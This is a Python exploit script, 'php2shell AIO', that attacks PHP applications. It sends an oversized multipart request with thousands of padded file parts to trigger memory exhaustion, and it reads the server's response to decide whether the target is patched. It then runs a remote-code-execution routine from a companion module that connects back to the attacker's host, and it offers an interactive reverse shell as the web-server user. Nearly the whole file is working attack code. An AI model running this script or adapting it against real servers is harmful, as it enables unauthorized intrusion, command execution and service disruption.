#!/usr/bin/env python3
"""php2shell AIO — one command, pre- or post-patch, stock config.

Cells, in order (each also selectable individually):
  probe  GET php2shell_probe.php  -> the attacked module reports PHP_VERSION|sapi|memory_limit
  arm    vendor-shape OOM arm (PHPSESSID + PHP_SESSION_UPLOAD_PROGRESS as the
         first two multipart parts + N padded file parts) against cve2_app.php.
         The vendor's own regression-test discriminator:
           visible "Allowed memory" fatal  -> POST-PATCH behavior (fix-era deferred OOM)
           silent 500 / connection crash   -> PRE-PATCH behavior (bailout era)
  rce    stock pubstate lever, run_once from stock_rce.py, N tries -> PUBSTATE=1
         + www-data banner (the lever RCE that survives the patch)
  shell  passthrough: stock_rce.py default pty shell (drops you in, blocks)

Requirements venue-side (stock config, no ini beyond the arm's five knobs the
vendor's own phpt pins — memory_limit cap, post_max_size, max_input_vars,
max_file_uploads, max_multipart_body_parts=-1): app.php, cve2_app.php,
php2shell_probe.php in the docroot. Attacker side: python3 stdlib only,
inbound rport/rport+1 for the dial-backs.

Examples:
  php2shell.py 192.168.51.170:18991            # probe+arm+rce, verdict
  php2shell.py 192.168.51.170:18991 --shell    # interactive www-data pty shell
  php2shell.py 192.168.51.170:18990 --arm      # discriminator only
"""
import argparse, os, socket, sys, urllib.request, urllib.error

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import stock_rce as sr

ARM_PARTS, ARM_PAD = 8000, 512

def arm_body(sid):
    B = b'--ARMBOUND\r\n'
    parts = [b'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n'
             + sid.encode() + b'\r\n',
             b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\narmP1\r\n']
    for i in range(ARM_PARTS):
        parts.append(('Content-Disposition: form-data; name="f[]"; filename="p%d.bin"\r\n'
                      'Content-Type: application/octet-stream\r\n\r\n' % i).encode()
                     + b'A' * ARM_PAD + b'\r\n')
    return B + b''.join(parts) + b'--ARMBOUND--\r\n'

def cell_probe(host, port):
    try:
        with urllib.request.urlopen('http://%s:%d/php2shell_probe.php' % (host, port), timeout=10) as r:
            return r.read().decode(errors='replace').strip()
    except urllib.error.HTTPError as e:
        return {404: 'MISSING (deploy php2shell_probe.php)'}.get(e.code, 'HTTP %d' % e.code)
    except Exception as e:
        return 'ERR ' + type(e).__name__

def cell_arm(host, port, path, timeout=120):
    req = urllib.request.Request('http://%s:%d%s' % (host, port, path),
                                 data=arm_body('armA1'), method='POST',
                                 headers={'content-type': 'multipart/form-data; boundary=ARMBOUND'})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            code, body = r.getcode(), r.read().decode(errors='replace')
    except urllib.error.HTTPError as e:
        code, body = e.code, e.read().decode(errors='replace')
    except (ConnectionError, http_reset) as e:
        return 'CRASH', 'connection reset/killed mid-arm (%s)' % type(e).__name__
    except Exception as e:
        return 'CRASH', 'connection died mid-arm (%s)' % type(e).__name__
    if 'Allowed memory' in body:
        return 'PATCHED', 'visible fatal in HTTP %d body (fix-era deferred OOM)' % code
    if code == 500:
        return 'VULNERABLE', 'silent 500, no fatal text (bailout era)'
    if not body.strip():
        return 'VULNERABLE', 'empty reply, no fatal text'
    return 'INERT', 'HTTP %d, arm did not fire — pin the 5 vendor knobs (memory_limit<=10M, body caps)' % code

http_reset = (ConnectionResetError, ConnectionAbortedError, ConnectionRefusedError, socket.timeout)

def cell_rce(host, port, rhost, rport, n):
    good = 0
    for i in range(n):
        r = sr.run_once(host, port, rhost, rport, 'id -un; echo php2shell-OK',
                        i, pubstate=True, shell=False)
        banner = ' / '.join((r.get('banner') or '').splitlines()) if r.get('banner') else ''
        print('[rce %d/%d] %s%s' % (i + 1, n, r['note'], ('  <- ' + banner) if banner else ''), flush=True)
        if r['ok'] and r['shell']:
            good += 1
    return good

def main():
    ap = argparse.ArgumentParser(description='PHP2Shell stock-config AIO')
    ap.add_argument('target', help='host[:port]')
    ap.add_argument('--rport', type=int, default=4455)
    ap.add_argument('--rhost', default=None)
    ap.add_argument('--n', type=int, default=3, help='rce cell tries (default 3)')
    ap.add_argument('--arm-path', default='/cve2_app.php')
    ap.add_argument('--probe', action='store_true')
    ap.add_argument('--arm', action='store_true')
    ap.add_argument('--rce', action='store_true')
    ap.add_argument('--shell', action='store_true', help='interactive pty shell (passthrough to stock_rce.py)')
    ap.add_argument('--no-arm', action='store_true', help='in --all mode: skip the behavioral arm')
    args = ap.parse_args()
    host, _, port = args.target.partition(':')
    port = int(port or 80)
    rhost = args.rhost or sr.local_ip()

    if args.shell:  # exclusive: drop into shell and exit
        os.execv(sys.executable, [sys.executable,
                    os.path.join(os.path.dirname(os.path.abspath(__file__)), 'stock_rce.py'),
                    args.target, '--rport', str(args.rport)] +
                   (['--rhost', rhost] if args.rhost else []))

    solo = args.probe or args.arm or args.rce
    probe = arm = rce = True
    if solo:
        probe, arm, rce = args.probe, args.arm, args.rce
    if args.no_arm:
        arm = False

    print('php2shell AIO — target %s:%d' % (host, port))
    ver, arm_class = None, None
    if probe:
        ver = cell_probe(host, port)
        print('[probe] module=%s' % ver)
    if arm:
        arm_class, detail = cell_arm(host, port, args.arm_path)
        print('[arm]   %s — %s' % (arm_class, detail))
    good = cell_rce(host, port, rhost, args.rport, args.n) if rce else None
    if rce:
        print('[rce]   %d/%d pubstate lever RCE (dial-back as web-server user)' % (good, args.n))

    print('--' * 18)
    if probe or arm or rce:
        line = []
        if ver and ver not in (None,) and 'MISSING' not in ver and not ver.startswith('ERR'):
            line.append('module %s' % ver.split('|')[0])
        if arm_class == 'PATCHED':
            line.append('arm shows visible-fatal: POST-PATCH behavior (fix era)')
        elif arm_class == 'VULNERABLE':
            line.append('arm shows silent/crash: PRE-PATCH behavior (bailout era)')
        if good is not None:
            line.append('lever RCE %s on this line' % ('CONFIRMED %d/%d' % (good, args.n) if good == args.n
                        else ('partial %d/%d' % (good, args.n) if good else 'FAILED %d/%d' % (good, args.n))))
        print('VERDICT: ' + ' · '.join(line) if line else 'VERDICT: inconclusive — see cell output')
    sys.exit(0 if (good in (None, args.n)) and (arm_class in (None, 'PATCHED', 'VULNERABLE')) else 1)

if __name__ == '__main__':
    main()
